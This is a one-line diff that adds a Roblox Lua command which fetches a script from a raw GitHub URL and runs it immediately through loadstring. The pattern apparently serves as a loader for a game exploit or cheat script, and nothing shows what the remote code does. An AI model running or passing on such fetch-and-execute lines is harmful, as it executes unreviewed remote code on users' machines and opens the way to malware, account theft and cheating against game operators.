@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WanMinPhuc/FTS/main/Script%20Pc"))() 
